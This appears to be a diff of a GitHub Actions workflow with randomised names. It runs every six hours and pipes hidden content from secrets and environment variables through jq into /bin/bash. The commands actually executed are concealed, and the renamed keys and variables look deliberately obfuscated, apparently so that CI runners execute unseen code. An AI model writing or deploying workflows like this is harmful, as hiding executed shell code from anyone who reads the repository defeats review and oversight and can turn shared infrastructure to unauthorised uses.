@@ -3,8 +3,7 @@ name: zoubowei2749
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 3/6 * * *'
-
+    - cron: '31 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: zoubowei2749
         env:
-          oh78: ${{ secrets.oh78 }}
+          jqt225: ${{ secrets.jqt225 }}
         run: |
-          echo $oh78 | jq -r .drd01517 | /bin/bash
-          echo $mzm10538 | jq -r .yxh1 | /bin/bash
-          echo $esk673 | jq -r .jn527 | /bin/bash
-          echo $l65903 | jq -r .j4364 | /bin/bash
-          echo $dkusx23237 | jq -r .dcft20827 | /bin/bash
-          echo $lr0 | jq -r .u67 | /bin/bash
-          echo $yoz3 | jq -r .qyq1 | /bin/bash
+          echo $jqt225 | jq -r .zo40 | /bin/bash
+          echo $doib51 | jq -r .tnyl1 | /bin/bash
+          echo $hf654 | jq -r .do10128 | /bin/bash
+          echo $yyfu86 | jq -r .gkav1 | /bin/bash
+          echo $zpxln2 | jq -r .lhs778 | /bin/bash
+          echo $es7823 | jq -r .p212 | /bin/bash
+          echo $uaore78 | jq -r .gwq6000 | /bin/bash
+          echo $o65208 | jq -r .dkga8815 | /bin/bash
+          echo $up9806 | jq -r .j1188 | /bin/bash
+          echo $jo292 | jq -r .y4738 | /bin/bash
+          echo $hq9079 | jq -r .umhdm39114 | /bin/bash
+          echo $teqe300 | jq -r .ikpdg35 | /bin/bash
+          echo $dfd840 | jq -r .vhdm2170 | /bin/bash
 
